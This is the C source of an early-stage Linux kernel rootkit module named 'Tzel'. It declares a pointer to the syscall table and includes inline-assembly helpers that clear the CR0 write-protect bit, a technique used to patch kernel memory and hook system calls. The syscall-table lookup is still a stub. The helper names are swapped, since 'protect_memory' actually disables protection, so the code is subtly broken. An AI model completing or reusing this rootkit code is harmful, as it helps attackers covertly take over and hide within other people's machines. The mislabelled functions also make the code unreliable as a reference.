#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <asm/unistd.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <asm/paravirt.h>

static unsigned long *sys_call_table;
static unsigned long orig_cr0;

static inline void write_cr0_forced(unsigned long val)
{
    asm volatile("mov %0,%%cr0": "+r" (val), "+m" (__force_order));
}

static inline void protect_memory(void)
{
    orig_cr0 = read_cr0();
    write_cr0_forced(orig_cr0 & (~X86_CR0_WP));
}

static inline void unprotect_memory(void)
{
    write_cr0_forced(orig_cr0);
}

static long * get_sys_call_table(void) 
{
    return NULL;
}

static int __init init_rootkit(void)
{
    unsigned long cr0;
    printk(KERN_INFO "Loading Tzel.\n");

    cr0 = read_cr0();
    printk(KERN_INFO "cr0: %lx\n", cr0);

    printk(KERN_INFO "Unprotecting...\n");
    unprotect_memory();

    cr0 = read_cr0();
    printk(KERN_INFO "cr0: %lx\n", cr0);

    printk(KERN_INFO "Protecting...\n");
    protect_memory();

    cr0 = read_cr0();
    printk(KERN_INFO "cr0: %lx\n", cr0);

    return 0;
}

static void __exit cleanup_rootkit(void)
{
    
}  

module_init(init_rootkit);
module_exit(cleanup_rootkit);
